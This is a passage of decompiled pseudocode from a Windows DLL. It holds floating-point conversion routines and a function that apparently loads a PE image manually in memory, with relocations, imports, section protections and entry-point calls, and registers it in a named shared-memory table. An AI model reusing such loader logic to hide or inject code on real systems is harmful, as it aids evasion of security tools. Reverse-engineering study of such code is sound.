      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_100B609C - 1;
      v25 = dword_100B609C / 32;
      v65 = dword_100B609C / 32;
      v26 = &v60 + dword_100B609C / 32;
      v64 = 31 - dword_100B609C % 32;
      if ( ((1 << (31 - dword_100B609C % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_100B609C % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_100B60A0 + 1) / 32;
      v37 = (dword_100B60A0 + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_100B60A0));
  if ( dword_100B60A4 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_100B60A4 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 100B6094: using guessed type int dword_100B6094;
// 100B6098: using guessed type int dword_100B6098;
// 100B609C: using guessed type int dword_100B609C;
// 100B60A0: using guessed type int dword_100B60A0;
// 100B60A4: using guessed type int dword_100B60A4;
// 100B60A8: using guessed type int dword_100B60A8;

//----- (1006ECFB) --------------------------------------------------------
int __cdecl sub_1006ECFB(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_100B60B4 - 1;
    v64 = v3;
    v65 = dword_100B60B4 / 32;
    v9 = &v60 + dword_100B60B4 / 32;
    v66 = 31 - dword_100B60B4 % 32;
    if ( ((1 << (31 - dword_100B60B4 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_100B60B4 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_100B60B0 - dword_100B60B4 )
    {
      if ( v3 > dword_100B60B0 )
      {
        if ( v3 < dword_100B60AC )
        {
          v60 &= ~0x80000000;
          v5 = dword_100B60C0 + v3;
          v50 = dword_100B60B8 / 32;
          v51 = dword_100B60B8 % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_100B60B8 % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_100B60B8 / 32;
          v44 = dword_100B60B8 % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_100B60B8 % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_100B60C0 + dword_100B60AC;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_100B60B0 - v64) / 32;
      v62 = v59;
      v18 = (dword_100B60B0 - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_100B60B4 - 1;
      v25 = dword_100B60B4 / 32;
      v65 = dword_100B60B4 / 32;
      v26 = &v60 + dword_100B60B4 / 32;
      v64 = 31 - dword_100B60B4 % 32;
      if ( ((1 << (31 - dword_100B60B4 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_100B60B4 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_100B60B8 + 1) / 32;
      v37 = (dword_100B60B8 + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_100B60B8));
  if ( dword_100B60BC == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_100B60BC == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 100B60AC: using guessed type int dword_100B60AC;
// 100B60B0: using guessed type int dword_100B60B0;
// 100B60B4: using guessed type int dword_100B60B4;
// 100B60B8: using guessed type int dword_100B60B8;
// 100B60BC: using guessed type int dword_100B60BC;
// 100B60C0: using guessed type int dword_100B60C0;

//----- (10071C3B) --------------------------------------------------------
unsigned __int64 __cdecl sub_10071C3B(const char *a1, const char **a2, int a3, struct localeinfo_struct *a4)
{
  return strtoxq(a4, a1, a2, a3, 0);
}
// 1007197E: using guessed type unsigned __int64 __cdecl strtoxq(struct localeinfo_struct *, const char *, const char **, _DWORD, _DWORD);

//----- (10071ECB) --------------------------------------------------------
int sub_10071ECB()
{
  return _unlock(7);
}
// 100591B6: using guessed type _DWORD __cdecl _unlock(_DWORD);

//----- (1007358F) --------------------------------------------------------
int __stdcall sub_1007358F(int a1, int a2, int a3)
{
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  _DWORD **v6; // esi
  int v7; // ebx

  v3 = 0;
  v4 = 268907936;
  v5 = 100;
  do
  {
    --v4;
    if ( !--v5 )
      return 1;
  }
  while ( *(_DWORD *)v4 != -267535686 );
  v6 = (_DWORD **)(v4 + 4);
  v7 = v4;
  if ( !(*(int (__stdcall **)(_DWORD, int))(v4 + 8))(**(_DWORD **)(v4 + 4), -1) )
  {
    do
    {
      if ( (*v6)[v3 + 3] )
        ((void (__stdcall *)(_DWORD, int, int))(*v6)[v3 + 3])((*v6)[v3 + 2], a2, a3);
      v3 += 136;
    }
    while ( v3 < 5440 );
    (*(void (__stdcall **)(_DWORD))(v7 + 12))(**v6);
  }
  return ((int (__stdcall *)(int, int, int))(*v6)[1])(a1, a2, a3);
}

//----- (10073612) --------------------------------------------------------
int __stdcall sub_10073612(int a1)
{
  int v2; // eax
  int (__stdcall *v3)(int, int, int *, _DWORD); // eax
  int v4; // ebx
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  unsigned int v8; // edx
  int v9; // ecx
  unsigned __int16 v10; // dx
  unsigned int v11; // edi
  unsigned __int16 v12; // dx
  unsigned int v13; // edi
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // edi
  int *k; // edi
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // ebx
  bool v23; // zf
  void (__stdcall *v24)(int, _DWORD, _DWORD); // ebx
  int v25; // eax
  int v26; // eax
  _DWORD *v27; // edi
  _DWORD *v28; // eax
  _DWORD *m; // ebx
  _DWORD *v30; // eax
  int *v31; // eax
  unsigned int v32; // edx
  int *v33; // ecx
  int v34; // ebx
  int v36; // [esp-8h] [ebp-7Ch]
  int v37; // [esp-4h] [ebp-78h]
  char v38[4]; // [esp+10h] [ebp-64h] BYREF
  int v39; // [esp+14h] [ebp-60h]
  int v40; // [esp+28h] [ebp-4Ch] BYREF
  int v41; // [esp+2Ch] [ebp-48h]
  int v42; // [esp+30h] [ebp-44h]
  int v43; // [esp+34h] [ebp-40h]
  _DWORD *v44; // [esp+38h] [ebp-3Ch]
  int v45; // [esp+3Ch] [ebp-38h]
  _DWORD *v46; // [esp+40h] [ebp-34h]
  int v47; // [esp+44h] [ebp-30h] BYREF
  int v48; // [esp+48h] [ebp-2Ch]
  int v49; // [esp+4Ch] [ebp-28h]
  int v50; // [esp+50h] [ebp-24h]
  int v51; // [esp+54h] [ebp-20h]
  void (__stdcall *v52)(int, _DWORD, _DWORD); // [esp+58h] [ebp-1Ch]
  int v53; // [esp+5Ch] [ebp-18h] BYREF
  int v54; // [esp+60h] [ebp-14h]
  int v55; // [esp+64h] [ebp-10h]
  int v56; // [esp+68h] [ebp-Ch]
  char v57; // [esp+6Eh] [ebp-6h]
  char v58; // [esp+6Fh] [ebp-5h]
  int v59; // [esp+7Ch] [ebp+8h]
  int i; // [esp+7Ch] [ebp+8h]
  unsigned int v61; // [esp+7Ch] [ebp+8h]
  _DWORD *j; // [esp+7Ch] [ebp+8h]
  int v63; // [esp+7Ch] [ebp+8h]
  char v64; // [esp+7Fh] [ebp+Bh]

  v40 = 0;
  v41 = 0;
  v42 = 0;
  v57 = 0;
  v55 = 0;
  v58 = 0;
  v54 = 0;
  v46 = 0;
  v48 = 0;
  v49 = 0;
  v50 = 0;
  v45 = 0;
  v47 = 0;
  v52 = 0;
  v53 = 0;
  v2 = (*(int (__stdcall **)(int))(a1 + 16))(a1 + 1140);
  v43 = v2;
  if ( !v2 )
    return 0;
  v3 = (int (__stdcall *)(int, int, int *, _DWORD))(*(int (__stdcall **)(int, int))(a1 + 28))(v2, a1 + 1153);
  if ( !v3 )
    return 0;
  if ( !v3(a1 + 1206, 1, &v53, 0) )
    return 0;
  v41 = v53;
  v4 = *(_DWORD *)(a1 + 2920) + a1 + 2860;
  v40 = 12;
  v42 = 0;
  if ( (*(_DWORD *)(v4 + 8) & 0xFFFFF807) - 695205888 > 0x6000000 )
    return 0;
  v59 = *(_DWORD *)(v4 + 80);
  if ( *(_BYTE *)(a1 + 2336) )
  {
    v5 = (*(int (__stdcall **)(int, unsigned int, int, _DWORD, int, _DWORD, _DWORD))(a1 + 80))(
           a1 + 2338,
           0x80000000,
           1,
           0,
           3,
           0,
           0);
    v56 = v5;
    if ( v5 == -1 )
      return 0;
    v51 = (*(int (__stdcall **)(int, _DWORD, int, _DWORD, int, _DWORD))(a1 + 40))(v5, 0, 16777218, 0, v59, 0);
    (*(void (__stdcall **)(int))(a1 + 76))(v56);
    if ( !v51 )
      return 0;
    v6 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int))(a1 + 48))(v51, 4, 0, 0, v59);
    v56 = v6;
    (*(void (__stdcall **)(int))(a1 + 76))(v51);
  }
  else
  {
    v6 = (*(int (__stdcall **)(_DWORD, _DWORD, int, int))(a1 + 4))(0, *(_DWORD *)(v4 + 80), 4096, 4);
    v56 = v6;
  }
  if ( !v6 )
    return 0;
  if ( (*(int (__stdcall **)(int, int, int, int *))(a1 + 12))(v6, v59, 4, &v47) )
  {
    (*(void (__cdecl **)(int, _DWORD, _DWORD))(a1 + 36))(v6, 0, *(_DWORD *)(v4 + 80));
    (*(void (__cdecl **)(int, int, _DWORD))(a1 + 32))(v6, a1 + 2860, *(_DWORD *)(v4 + 84));
    for ( i = 0; (unsigned __int16)i < *(_WORD *)(v4 + 6); ++i )
      (*(void (__cdecl **)(int, int, _DWORD))(a1 + 32))(
        v6 + *(_DWORD *)(40 * (unsigned __int16)i + v4 + 260),
        a1 + 2860 + *(_DWORD *)(40 * (unsigned __int16)i + v4 + 268),
        *(_DWORD *)(40 * (unsigned __int16)i + v4 + 264));
    v51 = v6 - *(_DWORD *)(v4 + 52);
    if ( v51 )
    {
      v7 = (_DWORD *)(v6 + *(_DWORD *)(v4 + 160));
      if ( v7 == (_DWORD *)v6 )
        goto LABEL_84;
      v8 = (unsigned int)v7 + *(_DWORD *)(v4 + 164);
      v44 = (_DWORD *)v8;
      while ( (unsigned int)v7 < v8 )
      {
        v61 = 0;
        v9 = v6 + *v7;
        if ( ((v7[1] - 8) & 0xFFFFFFFE) != 0 )
        {
          do
          {
            v10 = *((_WORD *)v7 + v61 + 4);
            v11 = v10;
            v12 = v10 & 0xFFF;
            v13 = v11 >> 12;
            if ( v13 )
            {
              if ( v13 != 3 )
                goto LABEL_84;
              *(_DWORD *)(v9 + v12) += v51;
            }
            ++v61;
          }
          while ( v61 < (unsigned int)(v7[1] - 8) >> 1 );
          v8 = (unsigned int)v44;
        }
        v7 = (_DWORD *)((char *)v7 + v7[1]);
        v6 = v56;
      }
    }
    v14 = v6 + *(_DWORD *)(v4 + 128);
    if ( v14 != v6 )
    {
      if ( *(_DWORD *)(v14 + 12) )
      {
        v15 = (_DWORD *)(v14 + 16);
        for ( j = v15; *v15; v15 = j )
        {
          if ( *(v15 - 3) )
            goto LABEL_84;
          v16 = v56 + *(v15 - 1);
          if ( !(*(int (__stdcall **)(int))(a1 + 24))(v16) )
            goto LABEL_84;
          v51 = (*(int (__stdcall **)(int))(a1 + 16))(v16);
          if ( !v51 )
            goto LABEL_84;
          for ( k = (int *)(v56 + *j); *k; ++k )
          {
            if ( *k >= 0 )
              v18 = v56 + *k + 2;
            else
              v18 = (unsigned __int16)*k;
            v19 = (*(int (__stdcall **)(int, int))(a1 + 28))(v51, v18);
            *k = v19;
            if ( !v19 )
              goto LABEL_84;
          }
          j += 5;
          if ( !*(j - 1) )
            break;
        }
      }
      v63 = 0;
      if ( *(_WORD *)(v4 + 6) )
      {
        while ( 1 )
        {
          v20 = *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 284);
          if ( (v20 & 0x20000020) != 0 )
            v48 = 1;
          if ( v20 < 0 )
            v49 = 1;
          if ( (v20 & 0x40000000) != 0 )
            v50 = 1;
          v21 = 1;
          if ( v48 )
          {
            v21 = v49 ? 64 : v50 != 0 ? 32 : 16;
          }
          else if ( v50 )
          {
            v21 = 2 * (v49 != 0) + 2;
          }
          if ( !(*(int (__stdcall **)(int, _DWORD, int, int *))(a1 + 12))(
                  v56 + *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 260),
                  *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 256),
                  v21,
                  &v47) )
            break;
          if ( (unsigned __int16)++v63 >= *(_WORD *)(v4 + 6) )
            goto LABEL_56;
        }
      }
      else
      {
LABEL_56:
        v22 = *(_DWORD *)(v4 + 40);
        v23 = v56 + v22 == 0;
        v24 = (void (__stdcall *)(int, _DWORD, _DWORD))(v56 + v22);
        v52 = v24;
        if ( !v23 && ((int (__stdcall *)(int, int, _DWORD))v24)(v56, 1, *(_DWORD *)(a1 + 2332)) == 1 )
        {
          v45 = 1;
          v25 = (*(int (__stdcall **)(int *, _DWORD, int))(a1 + 68))(&v40, 0, a1 + 618);
          v55 = v25;
          if ( v25 )
          {
            if ( !(*(int (__stdcall **)(int, int))(a1 + 72))(v25, -1) )
            {
              v58 = 1;
              v54 = (*(int (__stdcall **)(int, _DWORD, int))(a1 + 44))(983071, 0, a1 + 96);
              v64 = 0;
              if ( v54
                || (v64 = 1,
                    (v54 = (*(int (__stdcall **)(int, int *, int, _DWORD, int, int))(a1 + 40))(
                             -1,
                             &v40,
                             4,
                             0,
                             21768,
                             a1 + 96)) != 0) )
              {
                v26 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int))(a1 + 48))(v54, 2, 0, 0, 21768);
                v27 = (_DWORD *)v26;
                v46 = (_DWORD *)v26;
                if ( v26 )
                {
                  if ( !v64 )
                  {
LABEL_78:
                    v31 = 0;
                    v32 = 0;
                    v33 = v27 + 2;
                    while ( !v31 )
                    {
                      if ( !*v33 )
                        v31 = v33;
                      ++v32;
                      v33 += 136;
                      if ( v32 >= 0x28 )
                      {
                        if ( !v31 )
                          goto LABEL_84;
                        break;
                      }
                    }
                    v34 = v56;
                    v31[1] = (int)v52;
                    *v31 = v34;
                    v31[2] = 1;
                    v31[3] = *(_DWORD *)(a1 + 2332);
                    *((_BYTE *)v31 + 16) = *(_BYTE *)(a1 + 2336);
                    v31[135] = *(_DWORD *)(a1 + 2320);
                    (*(void (__cdecl **)(int, int, int))(a1 + 32))((int)v31 + 18, a1 + 1796, 522);
                    if ( v64 )
                    {
                      v27 = 0;
                      v54 = 0;
                      (*(void (__stdcall **)(int))(a1 + 56))(v55);
                      v55 = 0;
                      v58 = 0;
                    }
                    goto LABEL_87;
                  }
                  (*(void (__cdecl **)(int, _DWORD, int))(a1 + 36))(v26, 0, 21768);
                  v49 = 0;
                  while ( 1 )
                  {
                    v44 = (_DWORD *)(*(int (__stdcall **)(int))(a1 + 20))(a1 + 1274);
                    if ( !v44 )
                      break;
                    if ( ++v49 >= 5 )
                    {
                      if ( (unsigned int)(*(int (__stdcall **)(int, _DWORD, char *, int, _DWORD))(a1 + 60))(
                                           -1,
                                           0,
                                           v38,
                                           24,
                                           0) >= 0xC0000000 )
                      {
                        (*(void (__stdcall **)(int, _DWORD, char *, int, _DWORD))(a1 + 60))(-1, 0, v38, 24, 0);
                        break;
                      }
                      v28 = (_DWORD *)(*(_DWORD *)(v39 + 12) + 12);
                      for ( m = (_DWORD *)*v28; m != v28; m = (_DWORD *)*m )
                      {
                        if ( (_DWORD *)m[6] == v44 )
                        {
                          v27[1] = m[7];
                          v30 = (_DWORD *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 4))(
                                            0,
                                            *(_DWORD *)(a1 + 2328) + 20,
                                            4096,
                                            64);
                          if ( !v30 )
                            goto LABEL_84;
                          v30[4] = *(_DWORD *)(a1 + 32);
                          v30[3] = *(_DWORD *)(a1 + 56);
                          v30[2] = *(_DWORD *)(a1 + 72);
                          *v30 = -267535686;
                          v30[1] = v27;
                          v37 = *(_DWORD *)(a1 + 2328);
                          v36 = *(_DWORD *)(a1 + 2324);
                          v44 = v30 + 5;
                          (*(void (__cdecl **)(_DWORD *, int, int))(a1 + 32))(v30 + 5, v36, v37);
                          m[7] = v44;
                          break;
                        }
                      }
                      if ( v27[1] )
                      {
                        *v27 = v55;
                        goto LABEL_78;
                      }
                      break;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_84:
  v27 = v46;
  v34 = v56;
  v57 = 1;
LABEL_87:
  if ( v27 )
    (*(void (__stdcall **)(_DWORD *))(a1 + 52))(v27);
  if ( v54 )
    (*(void (__stdcall **)(int))(a1 + 76))(v54);
  if ( v58 )
    (*(void (__stdcall **)(int))(a1 + 56))(v55);
  if ( v55 )
    (*(void (__stdcall **)(int))(a1 + 76))(v55);
  (*(void (__stdcall **)(int))(a1 + 84))(v43);
  if ( v53 )
    (*(void (__stdcall **)(int))(a1 + 92))(v53);
  if ( v57 )
  {
    if ( v45 && v52 )
      v52(v34, 0, 0);
    if ( *(_BYTE *)(a1 + 2336) )
      (*(void (__stdcall **)(int))(a1 + 52))(v34);
    else
      (*(void (__stdcall **)(int, _DWORD, int))(a1 + 8))(v34, 0, 0x8000);
    return 0;
  }
  return v34;
}
// 10073612: using guessed type char var_64[4];

//----- (10073C16) --------------------------------------------------------
int __userpurge sub_10073C16@<eax>(int a1@<edi>, int a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // edi
  unsigned int v6; // eax
  _DWORD *v7; // edx
  unsigned int v8; // eax
  int v10; // eax
  int v12; // [esp+8h] [ebp-10h]
  void (__stdcall *v13)(_DWORD, _DWORD, _DWORD); // [esp+Ch] [ebp-Ch]
  int v14; // [esp+10h] [ebp-8h]
  char v15; // [esp+17h] [ebp-1h]
  int v16; // [esp+20h] [ebp+8h]

  v14 = 0;
  v13 = 0;
  v15 = 0;
  if ( a2 )
  {
    v3 = (*(int (__stdcall **)(int, _DWORD, int))a2)(2031617, 0, a2 + 618);
    v16 = v3;
    if ( v3 )
    {
      if ( !(*(int (__stdcall **)(int, int))(a2 + 72))(v3, -1) )
      {
        v4 = (*(int (__stdcall **)(int, _DWORD, int))(a2 + 44))(983071, 0, a2 + 96);
        v12 = v4;
        if ( v4 )
        {
          v5 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int, int))(a2 + 48))(v4, 2, 0, 0, 21768, a1);
          if ( v5 )
          {
            v6 = 0;
            v7 = (_DWORD *)(v5 + 8);
            while ( *v7 != *(_DWORD *)(a2 + 1144) )
            {
              ++v6;
              v7 += 136;
              if ( v6 >= 0x28 )
                goto LABEL_13;
            }
            v8 = v5 + 544 * v6;
            if ( (*(_DWORD *)(v8 + 16))-- == 1 )
            {
              v13 = *(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(v8 + 12);
              v15 = *(_BYTE *)(v8 + 24);
              (*(void (__cdecl **)(unsigned int, _DWORD, int))(a2 + 36))(v8 + 8, 0, 544);
            }
            else
            {
              v14 = 1;
            }
LABEL_13:
            (*(void (__stdcall **)(int))(a2 + 52))(v5);
          }
          (*(void (__cdecl **)(int))(a2 + 76))(v12);
        }
        (*(void (__stdcall **)(int))(a2 + 56))(v16);
      }
      (*(void (__stdcall **)(int))(a2 + 76))(v16);
      if ( v13 )
      {
        v13(*(_DWORD *)(a2 + 1144), 0, 0);
        if ( *(_BYTE *)(a2 + 1140) )
        {
          v14 = 1;
          if ( v15 )
            v10 = (*(int (__stdcall **)(_DWORD))(a2 + 52))(*(_DWORD *)(a2 + 1144));
          else
            v10 = (*(int (__stdcall **)(_DWORD, _DWORD, int))(a2 + 8))(*(_DWORD *)(a2 + 1144), 0, 0x8000);
          if ( !v10 )
            return 0;
        }
        else
        {
          return (v15 != 0) + 2;
        }
      }
    }
  }
  return v14;
}

//----- (10073D49) --------------------------------------------------------
void __cdecl sub_10073D49(int a1)
{
  int v2; // edi
  int v3; // eax
  void (__cdecl *v4)(int, int); // eax
  int v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+18h] [ebp+8h]

  v5 = *(_DWORD *)(a1 + 24);
  v6 = *(_DWORD *)(a1 + 4);
  v2 = (*(int (__cdecl **)(int, _DWORD, int))a1)(2032639, 0, v5);
  v3 = (*(int (__cdecl **)(int))(a1 + 12))(a1 + 28);
  if ( v3 )
  {
    v4 = (void (__cdecl *)(int, int))(*(int (__cdecl **)(int, int))(a1 + 16))(v3, a1 + 39);
    if ( v4 )
      v4(v2, a1 + 20);
  }
  __asm { retn }
}
// 10073DA5: unbalanced stack, ignored a potential tail call

//----- (10073DAF) --------------------------------------------------------
int __stdcall sub_10073DAF(int a1)
{
  int v1; // ebx
  void (__stdcall *v2)(int); // esi
  int (__stdcall *v3)(int); // edi
  int v4; // eax

  v1 = *(_DWORD *)(a1 + 12);
  v2 = *(void (__stdcall **)(int))(a1 + 4);
  v3 = *(int (__stdcall **)(int))(a1 + 8);
  (*(void (__stdcall **)(int, _DWORD, int))a1)(a1, 0, 0x8000);
  v4 = v3(v1);
  v2(v4);
  return 0;
}

//----- (100871D0) --------------------------------------------------------
int sub_100871D0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9178);
  sub_1000CC20(dword_100BF06C, v0);
  return atexit(sub_10089460);
}
// 100BF06C: using guessed type _DWORD dword_100BF06C[2];

//----- (100871F2) --------------------------------------------------------
int sub_100871F2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B91D8);
  sub_1000CC20(dword_100BF580, v0);
  return atexit(sub_1008946A);
}
// 100BF580: using guessed type _DWORD dword_100BF580[2];

//----- (10087214) --------------------------------------------------------
int sub_10087214()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
